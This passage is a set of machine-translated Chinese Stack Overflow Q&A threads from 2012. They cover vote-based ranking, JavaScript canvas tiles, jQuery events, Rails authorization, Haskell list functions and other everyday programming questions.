> 赞同：6
> 
> 时间：2012-04-22T17:44:13.690
> 
> 标签：math, voting, rating-system

我在网站上实现了一个简单的上/下投票系统，我跟踪个人投票以及投票时间和唯一用户 ID（散列 IP）。

我的问题不是如何计算选票的百分比或总和 - 而是更多，根据选票确定好分数的好算法是什么？

我发现按纯投票百分比排序是不可接受的，以及简单地统计赞成票。

考虑这个例子：

*   图片 A：4 票赞成，1 票反对
*   图片 B：5 票赞成，4 票反对
*   图片 C：1 票赞成，0 票反对

理想的系统会将 A 放在首位，然后可能是 B，然后是 C。

在纯百分比场景中，顺序为 C > A > B。（错误）在纯计票场景中，顺序为 B > A > C。（错误）

我有一个基于系统对分数的信心的某种“混合”算法的想法，可能类似于：

```
// (if totalvotes > 0, else score = 0)
score = 1 - ((downvotes+1 / totalvotes+1) * sqrt(1 / totalvotes)) 
```

但是，我希望在从现在到日落之前坐下来调整我的算法之前，询问社区是否已经存在任何我根本不知道的定义明确的算法。

我也有每次投票的日期数据——但是，网站的内容对时间不是很敏感，所以我根本不在乎按“热门内容”排序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:14:47.527

按平均票数排序不是很好。

相反，通过平衡正面评分的比例与本文中解释的少量观察的不确定性，您可以获得更好的分数表示。

下面的文章解释了如何不犯许多流行网站所犯的错误。（亚马逊、城市词典等）

[http://evanmiller.org/how-not-to-sort-by-average-rating.html](http://evanmiller.org/how-not-to-sort-by-average-rating.html)

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:58:01.510

我知道这不能回答你的问题，但我只是花了 3 分钟的时间来寻找一些公式，然后……检查一下:) A 列是赞成票，B 是反对票 :)

```
=(LN((A1+1)/(A1+B1+1))+1)*LN(A1)

5   3       0.956866995
4   1       1.133543015
5   4       0.787295787
1   0       0
6   4       0.981910844
2   8       -0.207447157
6   5       0.826007385
3   3       0.483811507
4   0       1.386294361
5   0       1.609437912
6   1       1.552503332
5   2       1.146431478
100 100     -3.020151034
10  10      0.813671022 
```

# java - Java：如何实现监听器以提供实时音频流位置？

> ID：10270422
> 
> 赞同：2
> 
> 时间：2012-04-22T17:44:13.877
> 
> 标签：java, events, audio, synchronize

我正在开发一个与实时音频播放同步的应用程序。我想定义一个具有特定时间步长的侦听器，并使用侦听器在每次播放的音频提前一个时间步长时获取更新。实现此功能必须是可能的（存在证明是音频播放器应用程序的时间计数器），但我想到的架构可能是不可能的。

理想情况下，我会在声卡的 SPEAKER 或 HEADPHONE 目标端口上收听音频流。现有的 LineListener/LineEvent 功能仅支持 START/STOP/OPEN/CLOSE 事件，我无法继承和扩充目标端口实现（或 SourceDataLine 或 TargetDataLine）。

我怎样才能做到这一点？我是否需要让线程不断轮询 getMicrosecondPosition() 或 getLongFramePosition() 方法并在适当的时间触发我自己的事件？这听起来非常低效。如果我使用 Timer 在固定时间段触发轮询，那么我会比仅在 Port/DataLines 支持的可用 START 和 STOP 事件之间使用系统计时器更好。我会调用 getMicrosecondPosition() 方法进行同步，但我认为这可能会由于系统计时器和实时音频之间的漂移而导致偶尔的错误。我希望看到计数器重复或跳过（即 1:23:003、1:23:004、1:23:006、1:23:007... 或 1:23:003、1:23 :004、1:23:004、1:23:005..）。

我正在查看 javazoom mp3 播放器源以了解他们是如何做到的，但到目前为止还没有运气。任何帮助/提示将不胜感激。

# ruby-on-rails-3 - 属性名称中的破折号没有得到 NoMethodError

> ID：10270425
> 
> 赞同：0
> 
> 时间：2012-04-22T17:44:24.573
> 
> 标签：ruby-on-rails-3, linkedin, erb

我正在使用 Linkedin gem 来提取 RoR 3 的个人资料信息。

*   宝石：[https ://github.com/pengwynn/linkedin](https://github.com/pengwynn/linkedin)
*   API 文档：[https ://developer.linkedin.com/documents/profile-fields#positions](https://developer.linkedin.com/documents/profile-fields#positions)

除非我到达名称中带有破折号的属性，否则一切正常。

`<%=position.title %>`正确显示但`<%= position.start-date %>`返回`NoMethodError`in `Users#show`- `undefined method start`。

我尝试了不同的操作，例如“startDate”、“start_date”、“start-date”周围的引号，但都没有奏效。

是否有适当的方法来转义属性名称中的破折号/连字符？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:04:52.027

ERB 中的表达式将被解析为从调用位置对象的 start() 方法的结果中减去日期变量的值。连字符在 Ruby 中的标识符中无效。

我对 LinkedIn gem 不够熟悉，无法提出解决方案，只是说由于它基于 XML API，因此您应该寻找一种方法来手动从标签对中提取数据。大多数类似的宝石都提供了这种方法。此外，这是将 IRB 用作探索性工具的一个很好的例子：启动一个 IRB 会话，看看当你调用 position.methods 时会发生什么，当然是在正确创建位置变量之后。我的猜测是，您会在该列表中看到一些暗示答案的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-29T21:26:14.007

看起来它返回一个转换键的 Hashie::Mash，还有一些额外的规则： [https ://github.com/pengwynn/linkedin/blob/master/lib/linked_in/mash.rb](https://github.com/pengwynn/linkedin/blob/master/lib/linked_in/mash.rb)

你说你已经试过了`position.start_date`对吧？那应该行得通。但如果没有，您是否尝试过`position['start-date']`或者`position['start_date']`这两个中的一个也应该可以工作，因为它是一个 Mash。

# javascript - 循环绘制多个随机画布图像

> ID：10270428
> 
> 赞同：1
> 
> 时间：2012-04-22T17:44:50.990
> 
> 标签：javascript, canvas

我正在尝试绘制一个网格，其中分配给每个正方形的随机图像。我在绘制顺序和 Javascript 变量的潜在关闭问题上遇到了问题。任何帮助表示赞赏。

```
var tileSize = 30;
var drawCanvasImage = function(ctx,tile,x,y) {
return function() {
    ctx.drawImage(tile,x,y);
    console.log("x = " + x + "/ y = " + y);
}
}

function textures(ctx) {
var grass = new Image();
var sea = new Image();
var woods = new Image();
for (var i=0; i<=10; i++) {
    for (var j=0; j<=20; j++) {
        rand = Math.floor(Math.random()*3 + 1);
        x = i * tileSize;
        y = j * tileSize;
        if (rand == 1) {
            grass.onload = drawCanvasImage(ctx,grass,x,y);
        } else if (rand == 2) {
            sea.onload = drawCanvasImage(ctx,sea,x,y);
        } else {
            woods.onload = drawCanvasImage(ctx,woods,x,y);
        }
    }
}
grass.src = "textures/grass.png";
sea.src = "textures/sea.png";
woods.src = "textures/woods.png";
}

//function called by the onload event in the html body tag
function draw() {
var ctx = document.getElementById("grid").getContext('2d');
grid(ctx);  //a function to draw the background grid - works fine
textures(ctx);
} 
```

当前的结果是三个绘制的瓦片，都在 x = 300 的位置（相当于 10 的 i 循环 * 30 的 tileSize）和一个随机的 y 位置。

在通过创建变量 drawCanvasImage 来解决（也许？）关闭问题之后，我至少得到了这三个图块来绘制。

----编辑---- 工作代码 - 修订版 2：

```
function randomArray() {
for (var i=0; i<=(xValue/tileSize); i++) {
    terrainArray[i] = [];
    for (var j=0; j<=(yValue/tileSize); j++) {
        rand = Math.floor(Math.random()*4 + 1);
        if (rand == 1) {
            terrainArray[i][j] = 3;
        } else if (rand == 2) {
            terrainArray[i][j] = 2;
        } else if (rand == 3) {
            terrainArray[i][j] = 1;
        } else {
            terrainArray[i][j] = 0;
        }
    }
}
}

var drawTerrain = function(ctx,tile,landUseValue) {
return function() {
    for (var i=0; i<=(xValue/tileSize); i++) {
        for (var j=0; j<=(yValue/tileSize); j++) {
            if (terrainArray[i][j] == landUseValue) {
                ctx.drawImage(tile,i*tileSize,j*tileSize);
            }
        }
    }
}
}

function textures(ctx) {
var grass = new Image();
var sea = new Image();
var woods = new Image();
var desert = new Image();
grass.onload = drawTerrain(ctx,grass,3);
sea.onload = drawTerrain(ctx,sea,0);
woods.onload = drawTerrain(ctx,woods,2);
desert.onload = drawTerrain(ctx,desert,1);
grass.src = "textures/grass.png";
sea.src = "textures/sea.png";
woods.src = "textures/woods.png";
desert.src = "textures/desert.png";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:01:02.937

这是因为每次执行循环时，都会为 [image].onload 分配一个新函数，从而覆盖之前的函数。这就是你最终只有三个图像的方式。这应该有效：

```
if (rand == 1) {
    grass.addEventlistener('load', drawCanvasImage(ctx,grass,x,y), false);
} else if (rand == 2) {
    sea.addEventlistener('load', drawCanvasImage(ctx,sea,x,y), false);
} else {
    woods.addEventlistener('load', drawCanvasImage(ctx,woods,x,y), false);
} 
```

在这里，您只需为每个循环添加一个新的侦听器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:06:46.580

您正在`onload`每次迭代中重写三个图像的 s 。因此，它只会执行最后添加的`onload`f 或每个图像。

建议：仅在加载 thred 后运行您的绘图方法（并且他们只是在`drawCanvasImage`没有 的情况下调用每次迭代`.onload=`）

更好的是：将随机数存储在一个数组中，让每个图像在加载时独立地遍历数组，并在适用的地方仅添加*其自身的副本。*

## 修订版 2 的改进

```
function randomArray() {
for (var i=0; i<=(xValue/tileSize); i++) {
    terrainArray[i] = [];
    for (var j=0; j<=(yValue/tileSize); j++) {
        rand = Math.floor(Math.random()*4 + 1);
        terrainArray[i][j] = 4-rand; 
        //OR: replace above two lines with terrainArray[i][j]=Math.floor(Math.random()*4 + 1);. There's no need to have them in exactly reverse order.
    }
}
}

var drawTerrain = function(ctx,tile,landUseValue) {
return function() {
    for (var i=0; i<=(xValue/tileSize); i++) {
        for (var j=0; j<=(yValue/tileSize); j++) {
            if (terrainArray[i][j] == landUseValue) {
                ctx.drawImage(tile,i*tileSize,j*tileSize);
            }
        }
    }
}
}

function textures(ctx) {
var grass = new Image();
var sea = new Image();
var woods = new Image();
var desert = new Image();
grass.onload = drawTerrain(ctx,grass,3);
sea.onload = drawTerrain(ctx,sea,0);
woods.onload = drawTerrain(ctx,woods,2);
desert.onload = drawTerrain(ctx,desert,1);
grass.src = "textures/grass.png";
sea.src = "textures/sea.png";
woods.src = "textures/woods.png";
desert.src = "textures/desert.png";
} 
```

为了使其*更加*灵活，您可以使用数组来存储图像，然后使用`length`. 这样，如果你想添加另一个图像，你所要做的就是修改数组。

```
var srcArray=["textures/grass.png","textures/sea.png","textures/woods.png","textures/desert.png"];
var imgArray=[];
var terrainArray=[];
function textures(ctx){
randomArray();
    for(var i=0;i<srcArray.length;i++){
        imgArray[i]=new Image();
        imgArray[i].src=srcArray[i];
        imgArray[i].onload=drawTerrain(ctx,i);
    }
}
function randomArray() {
for (var i=0; i<=(xValue/tileSize); i++) {
    terrainArray[i] = [];
    for (var j=0; j<=(yValue/tileSize); j++) {
        terrainArray[i][j]=Math.floor(Math.random()*srcArray.length);

    }
}
}

var drawTerrain = function(ctx,index) {
return function() {
    for (var i=0; i<=(xValue/tileSize); i++) {
        for (var j=0; j<=(yValue/tileSize); j++) {
            if (terrainArray[i][j] == index) {
                ctx.drawImage(imgArray[index],i*tileSize,j*tileSize);
            }
        }
    }
}
} 
```

所以现在，您所要做的就是`terrain(ctx)`在您想要加载所有图像时调用。而且，每当您想将图像*添加*到图像列表中时，只需将其添加到顶部的数组中即可。您不必深入挖掘并修改随机值等等。

# asp.net-mvc - ViewBag 值 mvc 中的可访问性

> ID：10270429
> 
> 赞同：0
> 
> 时间：2012-04-22T17:44:51.427
> 
> 标签：asp.net-mvc, partial-views, viewbag

我在其中定义 viewbag 值的控制器返回一个局部视图，这是返回的最后一个视图。

这个局部视图被呈现给一个 JQuery 对话框。关闭它后，我返回到之前的那个，其中包含一个表格。在表单视图（最后一个之前的那个）中，我试图通过 JS 函数访问 viewbag 值，并将其分配给表单中的隐藏字段。所以实际上，我正在尝试获取 viewbag 值，而不是从我发送 viewbag 的视图中获取。

这是个问题吗？viewbag 值是否只能从已渲染的最后一个视图中获得？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:36:44.033

我不确定这是否可能，但无论如何，您通常不希望或不需要在 ViewBag 所属的视图之外访问它。似乎会有几个更好的选择。

*   将所需的 ViewBag 值填充到 DOM 中其他位置的隐藏字段中。

*   由于您使用的是 JQuery 对话框，请考虑使用它的回调函数将您需要的值传递回主窗体。请参阅此处的示例： [jquery ui 对话框需要返回值，当用户按下按钮时，但不工作](https://stackoverflow.com/questions/6049687/jquery-ui-dialog-box-need-to-return-value-when-user-presses-button-but-not-wor)

# javascript - Lift 的 JavaScript 抽象层

> ID：10270433
> 
> 赞同：3
> 
> 时间：2012-04-22T17:45:25.420
> 
> 标签：javascript, scala, lift

我正在尝试从“Exploring Lift”一书中运行以下示例（稍作改动，即我更喜欢 CSS 绑定而不是 XML 绑定）：

```
object Hello {
  import js.{JxMap, Jx, JsCmds, JE}
  import JE._
  import net.liftweb.http.SHtml._
  import net.liftweb.util.BindHelpers._
  import JsCmds._

  val names = "marius" :: "tyler" :: "derek" :: "dave" :: "jorge" :: "viktor" :: Nil
  def ajaxian =
    "#text" #> ajaxText("Type something", {value => {
      val matches = names.filter(e => e.indexOf(value) > -1)
      SetHtml("items_list", NodeSeq.Empty) &
      JsCrVar("items", JsArray(matches.map(Str(_)):_*)) &
      JsCrVar("func", Jx(<ul>{
        JxMap(JsVar("it"), Jx(<li>{JsVar("it")}</li>))
      }</ul>).toJs) &
      (ElemById("items_list") ~> JsFunc("appendChild", Call("func", JsVar("items"))))
    }})
} 
```

但是，当呈现到 HTML 页面而不是同名列表中的名称时，我不断获得“JsExp(it)”项目的列表。线路应该有问题

```
JxMap(JsVar("it"), Jx(<li>{JsVar("it")}</li>)) 
```

Lift 缺乏关于 JavaScript 抽象层的文档，阅读书籍中的相应章节和浏览 Lift 的源代码并不能让我了解正在发生的事情。到目前为止，我唯一能想到的是使用参数`Jx`创建，但我无法说服自己正确使用Derek 在他的书中提供的示例。`AnonFunc``it``JsVar("it")`

# c# - 如何将线程挂起 1 毫秒？

> ID：10270438
> 
> 赞同：1
> 
> 时间：2012-04-22T17:45:44.283
> 
> 标签：c#

我需要很简单的东西

```
while (true) {
    DoJob();
    // wait 1 ms
} 
```

我应该使用`Thread.Sleep(1)`吗？我不确定是否使用`Timer`，因为它本身的开销似乎`Timer`比 1 毫秒多一点。

**更新**：我需要这个延迟来确保我收到了来自网络的最新信息，它是交易软件。我需要做点什么，然后我必须等待 1 毫秒才能看到会发生什么。我可以等待 1.5 毫秒，但不能等待 3 毫秒，那太长了。很少等待 5 或 10 毫秒是可以的，但通常应该是 ~1 毫秒

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:53:39.167

**编辑 - 更正了“您将从睡眠中获得的最分辨率约为 20 毫秒，而不是 100 毫秒**

即使您通过了 Sleep(1)，您从睡眠中退出的最高分辨率大约是 100 毫秒。

对于它的价值，计时器可能更有效 - 特别是如果您有超过 1 个线程处于休眠状态（如果您分配多个计时器，System.Threading.Timer 将使用尽可能少的线程，它们将共享一个计时线程）（来自 Joe Duffy 的并发编程书）

但更重要的是，你想做什么？如果您正在轮询——需要等待某事发生，您也许可以使用更有效的方法来做这件事。如果您只是需要经常启动一项任务，那么计时器可能是您最好的选择。

如果您只想停止一毫秒，请问为什么？您是否只是想确保您的线程屈服于其他进程？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T22:27:51.493

可能有另一种方法可以做到这一点。Windows 有一个高分辨率计时器。你可以在这里阅读：[“如何：使用高分辨率计时器”](http://msdn.microsoft.com/en-us/library/aa964692%28v=vs.80%29.aspx)

我认为这不像常规计时器那样工作——它不会触发事件，你只是用它来高精度地测量已经过去了多少时间。但是，您可以循环它，并在经过一毫秒时执行代码（您将一直消耗 CPU）。此外，我同意 Henk 的评论，即 Windows 不是实时操作系统——您永远不知道操作系统何时会暂停您的线程。

# javascript - JavaScript - 使画布成为全局变量

> ID：10270439
> 
> 赞同：2
> 
> 时间：2012-04-22T17:46:00.820
> 
> 标签：javascript, html

现在，我正在搞乱 HTML5 并使用 JavaScript 制作一个简单的 2D Tile 地图。进展顺利，但我意识到我不能把所有东西都放在一个巨大的函数中。

我正在尝试使`canvas`其他`context`函数可以访问全局变量。现在，它仅在“加载”时可用......我如何自己制作它？当我放置`canvas`并`context`创建变量时......我得到了错误`Uncaught TypeError: Cannot call method 'getContext' of null`

这是我的SSCCE：

```
// HTML5 JS Tile Example

// Set return 2D array of map
function loadMap(map) {
    if (map == 1) {
        return [
        [67, 67, 67, 67, 67, 67, 67, 67, 67, 190, 190, 67, 1, 1, 1, 1], [67, 393, 343, 343, 343, 343, 343, 343, 343, 190, 190, 448, 1, 166, 166, 1], [67, 343, 343, 393, 343, 343, 343, 343, 343, 343, 343, 448, 1, 166, 166, 1], [67, 1, 1, 1, 439, 1, 1, 1, 343, 13, 13, 13, 43, 166, 166, 1], [67, 1, 166, 166, 166, 166, 166, 1, 343, 13, 343, 448, 1, 166, 166, 1], [67, 1, 166, 166, 166, 166, 166, 1, 343, 13, 343, 448, 1, 166, 166, 1], [67, 1, 166, 166, 166, 166, 166, 1, 343, 13, 343, 448, 1, 319, 1, 1], [67, 1, 25, 1, 166, 321, 25, 1, 343, 13, 343, 343, 343, 343, 343, 67], [67, 424, 424, 424, 13, 424, 424, 424, 343, 13, 343, 343, 343, 394, 343, 67], [370, 13, 13, 13, 13, 13, 13, 13, 13, 13, 67, 67, 343, 343, 343, 67], [67, 67, 67, 67, 67, 67, 67, 67, 67, 370, 67, 67, 67, 67, 67, 67]];
    }
}

// On load...
window.onload = function () {
    var canvas = document.getElementById("canvas");
    var context = canvas.getContext("2d");
    var imageObj = new Image();
    var tiles = [];
    var board = loadMap(1);

    canvas.width = 512;
    canvas.height = 352;

    // 2\. SET UP THE MAP TILES
    for (x = 0; x <= 520; x++) {
        imageObj = new Image(); // new instance for each image
        imageObj.src = "line_tile/t" + x + ".png";
        tiles.push(imageObj);
    }
    var theX;
    var theY;
    // 3\. DRAW MAP BY ROWS AND COLS
    for (x = 0; x <= 10; x++) {
        for (y = 0; y <= 15; y++) {

            theX = x * 32;
            theY = y * 32;
            context.drawImage(tiles[board[x][y]], theY, theX, 32, 32);
        }
    }
}; 
```

在线示例： http: [//mystikrpg.com/html5/](http://mystikrpg.com/html5/)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T17:50:10.017

只需删除`var`声明并在外面声明变量：

```
// HTML5 JS Tile Example

// Set return 2D array of map
function loadMap(map) {
    if (map == 1) {
        return [
        [67, 67, 67, 67, 67, 67, 67, 67, 67, 190, 190, 67, 1, 1, 1, 1], [67, 393, 343, 343, 343, 343, 343, 343, 343, 190, 190, 448, 1, 166, 166, 1], [67, 343, 343, 393, 343, 343, 343, 343, 343, 343, 343, 448, 1, 166, 166, 1], [67, 1, 1, 1, 439, 1, 1, 1, 343, 13, 13, 13, 43, 166, 166, 1], [67, 1, 166, 166, 166, 166, 166, 1, 343, 13, 343, 448, 1, 166, 166, 1], [67, 1, 166, 166, 166, 166, 166, 1, 343, 13, 343, 448, 1, 166, 166, 1], [67, 1, 166, 166, 166, 166, 166, 1, 343, 13, 343, 448, 1, 319, 1, 1], [67, 1, 25, 1, 166, 321, 25, 1, 343, 13, 343, 343, 343, 343, 343, 67], [67, 424, 424, 424, 13, 424, 424, 424, 343, 13, 343, 343, 343, 394, 343, 67], [370, 13, 13, 13, 13, 13, 13, 13, 13, 13, 67, 67, 343, 343, 343, 67], [67, 67, 67, 67, 67, 67, 67, 67, 67, 370, 67, 67, 67, 67, 67, 67]];
    }
}

// On load...

var canvas;
var context;

window.onload = function () {
    canvas = document.getElementById("canvas");
    context = canvas.getContext("2d");
    var imageObj = new Image();
    var tiles = [];
    var board = loadMap(1);

    canvas.width = 512;
    canvas.height = 352;

    // 2\. SET UP THE MAP TILES
    for (x = 0; x <= 520; x++) {
        imageObj = new Image(); // new instance for each image
        imageObj.src = "line_tile/t" + x + ".png";
        tiles.push(imageObj);
    }
    var theX;
    var theY;
    // 3\. DRAW MAP BY ROWS AND COLS
    for (x = 0; x <= 10; x++) {
        for (y = 0; y <= 15; y++) {

            theX = x * 32;
            theY = y * 32;
            context.drawImage(tiles[board[x][y]], theY, theX, 32, 32);
        }
    }
}; 
```

这将在全局范围内创建变量。

# android - 在自定义对话框中使用 Listview (android)

> ID：10270440
> 
> 赞同：1
> 
> 时间：2012-04-22T17:46:05.467
> 
> 标签：android, listview, customdialog

我为我的列表视图创建了一个自定义 adpater，并创建了我的自定义对话框，其中包含一个列表视图，但我不知道如何将数据链接到自定义对话框中的列表视图（我在解释这一点方面做得非常糟糕知道）。我的适配器使用具有复选框的列表视图，我想知道在下次打开应用程序时是否检查了我如何存储。我将把它分成几个步骤，这样它就不会那么混乱：我想：在我现有的自定义对话框中使用我的适配器创建一个列表视图，为下次打开应用程序时存储复选框的状态。

（它没有显示，但我的列表视图称为 listviewdialog）

我的主要活动（只是自定义对话框位）

```
button = (Button) findViewById(R.id.button01);

    // add button listener
    button.setOnClickListener(new OnClickListener() {

      public void onClick(View arg0) {

        // custom dialog
        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.list);
        dialog.setTitle("The List");

        // set the custom dialog components - text, image and button
        TextView text = (TextView) dialog.findViewById(R.id.TextView01);
        text.setText("Did you not read the button? :P i'm not finshed on this yet XD");

        Button dialogButton = (Button) dialog.findViewById(R.id.Button01);
        // if button is clicked, close the custom dialog
        dialogButton.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });

        dialog.show();
      }
    }); 
```

我的自定义适配器：

```
package kevin.erica.box;

import kevin.erica.box.R;

import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.CheckBox;
import android.widget.ImageView;
import android.widget.TextView;

public class MobileArrayAdapter extends ArrayAdapter<String> {
private final Context context;
private final String[] values;

public MobileArrayAdapter(Context context, String[] values) {
    super(context, R.layout.list_adapter, values);
    this.context = context;
    this.values = values;
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {
    LayoutInflater inflater = (LayoutInflater) context
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    View rowView = inflater.inflate(R.layout.list_adapter, parent, false);
    CheckBox textView = (CheckBox) rowView.findViewById(R.id.checkBox1);
    textView.setText(values[position]);

    return rowView;
}
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:55:03.620

在设置对话框的部分：

```
String[] mData;
// get your data; I don't know where its coming from
MobileArrayAdapter mAdapter = new MobileArrayAdapter(getContext(), mData);
ListView mListView = (ListView) dialog.findViewById(R.id.listviewdialog);
mListView.setAdapter(mAdapter); 
```

# ruby-on-rails - 为什么与我的示例相比，使用授权库会更好？

> ID：10270442
> 
> 赞同：1
> 
> 时间：2012-04-22T17:46:07.337
> 
> 标签：ruby-on-rails, authorization

我正在为我正在构建的应用程序添加授权，我有一个问题。我在我的用户表中添加了一个 :admin 列并将其设置为布尔值。在我的控制器中，我添加了以下代码：

```
class ShipsController < ApplicationController

  def index
    ships = Ship.all
    @ships = ships.sort_by { |v| [v[:empire_image], v[:cost]] }
    if current_user.admin == true
      respond_to do |format|
        format.html # index.html.erb
        format.json { render json: @ships }
      end
    else
      respond_to do |format|
        format.html { redirect_to root_path }
      end
    end
  end 
```

看来我必须将其添加到我的所有操作中，这似乎是错误的。我的问题是，这样做是不安全的还是只是为自己做更多的工作，但很好。

另外我正在使用 railstutorial.org 的身份验证，我想知道像 cancan 这样的库是否可以很好地使用它。

谢谢你的时间，尼克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:58:47.160

这种方式不是不安全的，它只是*让你的控制器混乱*，至少考虑使用 before_filter 来授权你的操作。

也许对于一个简单的应用程序，使用 3rd 方授权 gem 可能看起来有点过头了，但是将**授权规则移动到一个地方**是一件非常好的事情（`ability.rb`CanCan 的情况下的文件）。

您可以将 CanCan 与该身份验证系统一起使用，CanCan 只希望`current_user`控制器中存在一个方法。

# jquery - 如何用 0 替换空表单字段以防止 JQuery 中出现 NaN？

> ID：10270446
> 
> 赞同：2
> 
> 时间：2012-04-22T17:46:30.100
> 
> 标签：jquery

HTML

```
<input type='text' id='costs' value='100' size='3'></input> 
```

jQuery

```
var costs = $("#costs");
var c = parseFloat(costs.val().replace(",",".")); //germany ;)
costs.text(c); 
```

如果我将输入字段留空，我会得到 NAN。如果输入字段为空，我需要更改什么以将输入字段替换为 0？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T18:00:30.687

```
var val = costs.val().replace(",","."),
c = isNaN(val) ? 0 : parseFloat(val); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:59:43.757

捕获表单提交。查找所有输入并检查文本是否为空，如果是，则添加“0”。

```
$('#form').submit(function(){
  var theInputs = $(this).find('input');
  $.each(theInputs, function(i,obj){
    if($(obj).text() == ''){ //we could have checked for empty. I checked for no string.
      $(obj).text('0');
      return true; //let the form continue with the submit.
    }
  });
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T18:00:17.377

我不知道你的用户案例，但是，你可以做一个简单的检查`NaN`并将其设置为 0。

像这样：

```
$("#set").click(function(){
    var costs = $("#costs");
    var c = parseFloat(costs.val().replace(",",".")); //germany ;)
    alert(c);
    if(!isNaN(c)) {
        costs.val(c);
    } else {
        costs.val("0");
    }
});
​ 
```

html:

```
<input type='text' id='costs' value='100' size='3'></input>
<button id="set">Set</button> 
```

在此处查看工作演示：http: [//jsfiddle.net/jBeN9/](http://jsfiddle.net/jBeN9/)

如果你想让代码看起来更简洁，你可以使用像这样的三元运算符，**这是一样的**。：

```
$("#set").click(function(){
    var costs = $("#costs");
    var c = parseFloat(costs.val().replace(",",".")); //germany ;)
    costs.val((isNaN(c) ? "0" : c));
}); 
```

​</p>

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-11-01T05:43:39.410

如果你想用 0 替换 NaN，只需这样写：

```
var c = parseFloat(costs.val().replace(",",".")) || 0; 
```

# haskell - Haskell：将字符串转换为句子

> ID：10270449
> 
> 赞同：1
> 
> 时间：2012-04-22T17:47:12.347
> 
> 标签：haskell

我正在学习haskell，但遇到了问题。类型必须是： `sentences :: [String] -> [String]`

我想把字符串转换成句子

```
["something","","Asd dsa abc","hello world..",""] 
```

看起来像这样：`["Something.","Asd dsa abc.","Hello world..."]`

我想使用像map这样的高阶函数。我只是不知道怎么做这个。

我设法使用单个字符串：

```
import Data.Char
sentences :: String -> String
sentences [] = []
sentences (a:as) = (( toUpper a):as) ++ "." 
```

所以我从中得到：

```
sentences "sas das asd" 
```

这：`"Sas das asd."`

我希望有人可以帮助我解决这个问题。谢谢你的帮助！

编辑：感谢您的帮助，现在看起来像这样：

```
import Data.Char
sentences :: [String] -> [String]
sentence (a:as) = ((toUpper a):as)++['.']
sentences = map sentence 
```

但我不知道在哪里放置过滤器

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T17:52:39.157

与 map 结合使用的函数可以帮助您完成一半，但它不会从字符串列表中删除空字符串。你可以用过滤器做到这一点，所以总的来说

```
sentences ss = map sentence $ filter (/="") ss 
```

请注意，`sentences`（复数）的核心只是`sentence`（单数）在字符串列表上的映射。过滤器仅用于删除空字符串。如果没有这个要求，它只会是`sentences ss = map sentence ss`.

现在您可以`sentences`使用字符串列表调用以转换每个元素，除了被删除的空字符串`filter`

一般来说，如果你有一个`foo`转换`bar`成的函数`baz`，你可以使用`map foo`转换`[bar]`成`[baz]`

`filter`, like `map`, 是一个高阶函数，给定一个谓词函数和一个列表，返回一个列表，该列表由谓词所针对的元素组成`True`。在这种情况下，我们给出谓词函数`(/="")`，它`True`适用于所有非空字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T19:34:54.490

您也可以通过列表理解来做到这一点

```
import Data.Char

capFirst (l:ls) = toUpper l : ls ++ "."

sentences strings = [
                     capFirst sentence | sentence <- strings,
                     sentence /= []
                    ]

main = print $ sentences ["something","","Asd dsa abc","hello world..",""] 
```

# jquery - JQuery 更改直到模糊才会触发

> ID：10270452
> 
> 赞同：39
> 
> 时间：2012-04-22T17:47:23.317
> 
> 标签：jquery

我使用 change(handler) 来监听 textarea 的更改事件，但我只在 textarea 失去焦点时收到一个事件，但我想在值更改后立即收到一个事件。

```
$("#text_object").change(listener);
function listener(dom){
alert("I'm not getting here before the textarea loses focus");
} 
```

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2016-01-14T11:29:32.167

根据此处的正确答案[，输入元素上的 Javascript 更改事件只会在失去焦点时触发](https://stackoverflow.com/questions/7105997/javascript-change-event-on-input-element-fires-on-only-losing-focus)

你应该做这样的事情

```
$('#name').on('change textInput input', function () {

}); 
```

但是我发现同时拥有 textInput 和 input 事件会导致事件触发两次，你不希望这样，所以就这样做

`$('#name').on('change input', function () { ...`

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2012-04-22T17:55:43.900

不幸的是，浏览器仅在字段模糊时才识别更改，因此您可能想尝试附加一个 keyup 侦听器。不幸的是，这不是最优雅的解决方案。

[http://api.jquery.com/keyup/](http://api.jquery.com/keyup/)上的详细信息。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-04-22T17:59:10.260

你可以这样做。只要确保你给 textarea 一个 id 标签

```
$(document).ready(function(){
        $('.addtitle').keyup(function(event) {
            if(event.keyCode==13) { 

}
});
}); 
```

就我而言，我在 Enter 键上触发了该功能（如 facebooks 功能）。

编辑：另外，如果您在页面上有多个文本区域，您应该这样做：

```
$(document).ready(function(){
        $('textarea[name=mynamevalue]').keyup(function(event) {
            if(event.keyCode==13) { 

}
});
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-11-03T12:27:31.140

这就是我所做的：

```
/* Get the current value of the input and save it 
 *  in a data attribute before any change is made to it */
$(document).on('keydown','input', function(){
   $(this).data('value',$(this).val());
});

/* Compare the values after the keyup event*/
$(document).on('keyup','input', function(){
  if($(this).data('value') != $(this).val()){
